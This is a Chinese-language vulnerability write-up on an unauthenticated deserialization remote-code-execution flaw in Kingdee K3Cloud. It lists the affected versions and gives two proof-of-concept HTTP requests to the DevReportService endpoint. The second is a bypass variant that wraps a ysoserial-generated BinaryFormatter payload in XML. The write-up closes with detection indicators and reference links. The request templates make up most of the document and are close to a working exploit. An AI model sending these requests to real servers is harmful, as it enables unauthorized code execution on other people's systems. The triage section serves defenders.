# 金蝶 K3Cloud 反序列化漏洞

## 漏洞描述

由于金蝶云星空能够使用format参数指定数据格式为二进制，攻击者可以 通过发送由BinaryFormatter恶意序列化后的数据让服务端进行危险的BinaryFormatter反序列化操作。反序列化过程中没有对数据进行签名或校验，导致攻击者可以在未授权状态下进行服务器远程代码执行。

## 影响范围

- 金蝶云星空<6.2.1012.4
- 7.0.352.16<金蝶云星空<7.7.0.202111
- 8.0.0.202205<金蝶云星空<8.1.0.20221110

## 漏洞复现

漏洞原理：由于金蝶云星空管理中心在处理序列化数据时，未对数据进行签名或校验，攻击手可以写入包含恶意代码的序列化数据，系统在进行反序列化时造成远程命令执行，该“管理中心“是提供给管理员使用的管理端，默认开放于8000端口。

漏洞利用POC：

```
POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessO
bjectData.common.kdsvc HTTP/1.1
Host: 127.0.0.1
User-Agent: firefox
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
mage/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=
0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="111", "Chromium";v="111", "Not=A?Brand";v="2
4"
sec-ch-ua-mobile: ?0
Content-Type: text/json
Content-Length: 5725

ap0=paylod&format=3
```

paylod需要进⾏⼀次url编码。

漏洞利用POC2绕过：

```
POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessO
bjectData.common.kdsvc HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/111.0.5520.225 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
mage/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=
0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="111", "Chromium";v="111", "Not=A?Brand";v="2
4"
sec-ch-ua-mobile: ?0
Content-Type: text/json
Content-Length: 2416

{
 "ap0":
"<KingdeeXMLPack z:Id=\"1\" z:Type=\"Kingdee.BOS.ServiceFacade.KingdeeXMLP
ack\" z:Assembly=\"Kingdee.BOS.ServiceFacade.Common, Version=1.0.0.0, Cult
ure=neutral, PublicKeyToken=null\" xmlns=\"http://schemas.datacontract.or
g/2004/07/Kingdee.BOS.ServiceFacade\" xmlns:i=\"http://www.w3.org/2001/XML
Schema-instance\" xmlns:z=\"http://schemas.microsoft.com/2003/10/Serializa
tion/\"><_x003C_Data_x003E_k__BackingField z:Id=\"2\">{BinaryPaylad}</_x00
3C_Data_x003E_k__BackingField></KingdeeXMLPack>",
 "format": "4"
}
```

*其中ap0中替换为ysoserial.exe中生成的内容，通常情况下为200响应。*

## 研判分析

- 请求方法POST
- 请求路径：/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc
- 请求内容ap0中的内容
- 响应状态码200及内容


## 参考链接

⾦蝶K3Cloud反序列化分析及利⽤

<https://www.websecuritys.cn/index.php/archives/667/>

金蝶云星空 反序列化远程代码执行漏洞 附检测POC

<https://cn-sec.com/archives/1815530.html>

金蝶云星空反序列化远程代码执行漏洞复现

<https://www.gksec.com/K3cloud_rce.html>
